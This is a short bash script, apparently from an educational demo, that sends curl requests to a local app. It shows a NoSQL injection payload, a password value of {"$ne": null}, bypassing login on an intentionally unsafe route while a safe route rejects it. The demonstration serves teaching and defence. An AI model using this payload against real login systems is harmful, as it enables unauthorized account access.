#!/bin/bash
# Run injection_demo.py first (see that file). Then: ./attack.sh
URL=http://localhost:5004
H="Content-Type: application/json"

echo "1) Wrong password on the UNSAFE route (expected: logged_in false)"
curl -s -X POST $URL/login-unsafe -H "$H" -d '{"username":"admin","password":"wrong"}'
echo

echo "2) Attack on the UNSAFE route: password is {\"\$ne\": null}, not a string (expected: logged_in TRUE)"
curl -s -X POST $URL/login-unsafe -H "$H" -d '{"username":"admin","password":{"$ne":null}}'
echo

echo "3) Same attack on the SAFE route (expected: 400 error)"
curl -s -X POST $URL/login-safe -H "$H" -d '{"username":"admin","password":{"$ne":null}}'
echo
